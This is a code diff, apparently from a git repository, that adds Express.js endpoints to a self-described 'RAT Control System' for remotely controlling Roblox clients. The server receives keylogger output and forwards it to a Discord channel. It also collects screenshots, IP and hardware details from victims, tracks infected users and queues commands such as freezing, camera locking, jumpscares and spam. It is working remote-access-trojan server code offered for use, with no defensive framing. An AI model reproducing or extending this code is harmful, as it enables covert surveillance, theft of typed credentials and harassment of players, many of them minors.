+            await sendDiscordMessage("🔌 Новый инжект!", description, 0x00ff00);
+        }
+        
+        if (command === "cameralock") {
+            const action = args[0] || "toggle";
+            const targetText = target || "всех игроков";
+            await sendDiscordMessage("🎥 Блокировка камеры", `**Цель:** ${targetText}\n**Действие:** ${action}`, 0x3498db);
+        }
+        
+        if (command === "camerashake") {
+            const duration = args[0] || 5;
+            const intensity = args[1] || 2;
+            const targetText = target || "всех игроков";
+            await sendDiscordMessage("📷 Тряска камеры", `**Цель:** ${targetText}\n**Длительность:** ${duration} сек\n**Интенсивность:** ${intensity}`, 0xe67e22);
+        }
+        
+        if (command === "spam_completed") {
+            await sendDiscordMessage("📁 Спам завершен", `**Тип:** ${args[0]}\n**Результат:** ${args[1]}`, 0xf39c12);
+        }
+        
+        if (command === "user_chat") {
+            await sendDiscordMessage("💬 Чат игрока", `**Игрок:** ${args[0]}\n**Сообщение:** ${args[1]}`, 0x3498db);
+        }
+        
+        res.json({ status: "OK" });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
+});
+
+// Получение списка онлайн пользователей
+app.get('/users', (req, res) => {
+    cleanupInactiveUsers();
+    const users = Array.from(global.onlineUsers.values());
+    res.json({
+        users: users,
+        count: users.length
+    });
+});
+
+// Обновление информации о пользователе
+app.post('/users', (req, res) => {
+    try {
+        const { player, place, executor, device } = req.body;
+        global.onlineUsers.set(player, {
+            player: player,
+            place: place,
+            executor: executor,
+            device: device || "Unknown",
+            lastSeen: Date.now()
+        });
+        res.json({ status: "OK" });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
+});
+
+// Скриншоты
+app.post('/screenshot', (req, res) => {
+    try {
+        const { image } = req.body;
+        lastScreenshot = image;
+        res.json({ status: "OK" });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
+});
+
+app.get('/screenshot', (req, res) => {
+    res.json({ 
+        image: lastScreenshot || null 
+    });
+});
+
+// Кейлоггер
+app.post('/keylog', async (req, res) => {
+    try {
+        const { logs } = req.body;
+        await sendDiscordMessage("⌨️ Кейлоггер", `\`\`\`${logs.slice(0, 1900)}\`\`\``, 0xe74c3c);
+        res.json({ status: "OK" });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
+});
+
+// Получение информации о железе
+app.post('/hardware', async (req, res) => {
+    try {
+        const { player, data } = req.body;
+        await sendDiscordMessage(
+            "💻 Информация о системе",
+            `**Игрок:** ${player}\n**Игра:** ${data.game}\n**FPS:** ${data.fps}\n**Пинг:** ${data.ping}\n**Экзекутор:** ${data.executor}\n**Устройство:** ${data.device_type}\n**IP Инфо:** ${data.ip_info}`,
+            0x9b59b6,
+            [
+                {
+                    name: "Системная информация",
+                    value: `Touch: ${data.system.touch_enabled}\nMouse: ${data.system.mouse_enabled}\nKeyboard: ${data.system.keyboard_enabled}\nScreen: ${data.system.screen_size.X}x${data.system.screen_size.Y}`,
+                    inline: true
+                }
+            ]
+        );
+        res.json({ status: "OK" });
+    } catch (e) {
+        res.status(400).json({ error: e.message });
+    }
+});
+
+// Статус сервера
+app.get('/status', (req, res) => {
+    cleanupInactiveUsers();
+    res.json({
+        status: "online",
+        version: "3.1.0",
+        online_users: global.onlineUsers.size,
+        pending_commands: commandQueue.length,
+        discord_bot: discordClient && discordClient.user ? {
+            username: discordClient.user.tag,
+            status: "online",
+            commands_count: 27,
+            targeted_commands: true
+        } : { status: "disabled" }
+    });
+});
+
+// Информация о системе
+app.get('/system_info', (req, res) => {
+    res.json({
+        name: "RAT Control System",
+        version: "3.1.0",
+        description: "Продвинутая система удаленного управления Roblox клиентами",
+        server: SERVER_URL,
+        features: [
+            "Управление игроком (кик, заморозка, телепорт)",
+            "Скример система (Джефф Килер, Соник.exe)",
+            "Камерные команды (блокировка, тряска)",
+            "Чат система с сообщениями",
+            "Мониторинг устройств",
+            "Кейлоггер",
+            "Spam инструменты",
+            "Таргетированные команды (исправленный парсер)"
+        ],
+        total_commands: 27,
+        discord_bot: discordClient && discordClient.user ? {
+            username: discordClient.user.tag,
+            status: "online",
+            commands_count: 27,
+            targeted_commands: true
+        } : { status: "disabled_no_token" }
+    });
+});
+
+// Корневой путь
+app.get('/', (req, res) => {
+    res.json({
+        message: "RAT Control System v3.1",
+        endpoints: [
+            "GET  /data?player=NAME - Получение команд",
+            "GET  /users - Онлайн пользователи",
+            "GET  /status - Статус системы",
+            "GET  /system_info - Информация о проекте",
+            "POST /command - Отправка команд",
+            "POST /users - Обновление информации о пользователе",
+            "POST /screenshot - Загрузка скриншотов",
+            "POST /keylog - Отправка логов кейлоггера",
+            "POST /hardware - Информация о системе"
+        ],
+        documentation: "Используйте /help в Discord для управления",
+        new_features: "✅ Исправленный парсер команд | ✅ CameraLock | ✅ CameraShake | ✅ Express.js"
+    });
+});
+
+// Запуск сервера
+app.listen(PORT, () => {
+    console.log(`🚀 Сервер Express запущен на порту ${PORT}`);
     console.log(`🌐 URL: ${SERVER_URL}`);
     console.log('📡 Эндпоинты:');
     console.log('• GET  /data?player=NAME - Получение команд для клиента');
@@ -1114,6 +867,7 @@ server.listen(PORT, () => {
     console.log('• ✅ Исправленный парсер команд (не путает текст с никами)');
     console.log('• ✅ CameraLock - блокировка камеры игрока');
     console.log('• ✅ CameraShake - тряска камеры с настройкой интенсивности');
+    console.log('• ✅ Express.js - улучшенная архитектура сервера');
     console.log('');
     
     if (DISCORD_TOKEN) {
@@ -1124,8 +878,16 @@ server.listen(PORT, () => {
         console.log('• /camerashake [ник] <секунды> <интенсивность> - Тряска');
         console.log('• /jumpscare [ник] <тип> - Скримеры');
         console.log('🎯 Формат: /команда [ник] [аргументы]');
-        console.log('⚠️  Теперь /fakeerror текст работает правильно!');
     } else {
-        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN');
+        console.log('⚠️ Discord команды недоступны - установи DISCORD_TOKEN в Environment');
     }
+});
+
+// Обработка ошибок
+process.on('uncaughtException', (err) => {
+    console.error('❌ Необработанное исключение:', err);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+    console.error('❌ Необработанный промис:', reason);
 });
